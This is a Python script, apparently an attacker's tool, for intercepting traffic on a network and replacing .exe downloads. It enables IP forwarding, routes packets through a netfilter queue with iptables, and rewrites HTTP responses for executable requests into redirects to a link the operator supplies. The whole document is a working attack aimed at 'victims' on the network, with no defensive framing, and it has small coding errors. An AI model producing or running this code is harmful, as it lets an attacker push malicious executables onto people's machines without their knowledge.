#!/usr/bin/python
import scapy.all as scapy
import netfilterqueue
import subprocess
import optparse



def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-e", "--exe", dest="exe", help="give the link to the replacement software")
    (option) = parser.parse_args()
    return option

def set_load(packet,load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

ack_list = []

def process_packet(packet):
    option = get_arguments()
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet= set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: "+option.exe+"\n\n")
                packet.set_payload(str(modified_packet))


    """to forward packets to the router"""
    packet.accept()
if __name__ == "__main__":
    try:
        subprocess.call(["echo 1 > /proc/sys/net/ipv4/ip_forward"], shell=True)
        answr = input("enter 1 to run on local 0 to run on the network => ")
        if answr == 1:
            subprocess.call(["iptables -I OUTPUT -j NFQUEUE --queue-num 0"], shell=True)
            subprocess.call(["iptables -I INPUT -j NFQUEUE --queue-num 0"], shell=True)
        elif answr == 0:
            """to use on local machine not on the victims"""
            subprocess.call(["iptables -I FORWARD -j NFQUEUE --queue-num 0"], shell=True)
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        subprocess.call(["iptables --flush"], shell=True)
        print("\n  [+] Dtected Ctrl+C -------> Quitting.")
